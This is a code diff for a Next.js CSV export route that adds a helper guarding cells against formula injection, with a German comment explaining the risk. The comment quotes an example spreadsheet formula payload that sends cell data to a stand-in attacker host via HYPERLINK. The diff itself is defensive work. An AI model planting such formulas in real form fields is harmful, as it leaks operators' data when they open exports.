@@ -98,12 +98,33 @@ export async function GET(request: NextRequest) {
       ]
     })
 
+    /**
+     * Eine Zelle so schreiben, dass Excel sie als Text behandelt.
+     *
+     * Excel, LibreOffice und Google Sheets deuten jede Zelle, die mit = + - @
+     * oder einem Tabulator beginnt, als Formel — auch aus einer CSV-Datei.
+     * Der Vorname ist ein öffentliches Formularfeld: Wer sich mit dem Vornamen
+     *
+     *     =HYPERLINK("https://evil.tld?d="&A1;"Klick mich")
+     *
+     * anmeldet, hinterlegt eine Formel, die beim Öffnen des Exports im
+     * Tabellenprogramm des Betreibers ausgeführt wird und Daten nach draussen
+     * schickt. Der Angriff wandert also aus dem Web in die Office-Umgebung.
+     *
+     * Das vorangestellte Hochkomma ist die übliche Kennzeichnung für "das ist
+     * Text". Es taucht in der Zelle nicht auf.
+     */
+    const escapeCsvCell = (value: string): string => {
+      const text = String(value ?? '')
+      const needsGuard = /^[=+\-@\t\r]/.test(text)
+      const guarded = needsGuard ? `'${text}` : text
+      return `"${guarded.replace(/"/g, '""')}"`
+    }
+
     // Build CSV content
     const csvContent = [
       headers.join(','),
-      ...rows.map((row: string[]) =>
-        row.map((cell: string) => `"${String(cell).replace(/"/g, '""')}"`).join(',')
-      ),
+      ...rows.map((row: string[]) => row.map(escapeCsvCell).join(',')),
     ].join('\n')
 
     // Add BOM for Excel UTF-8 compatibility
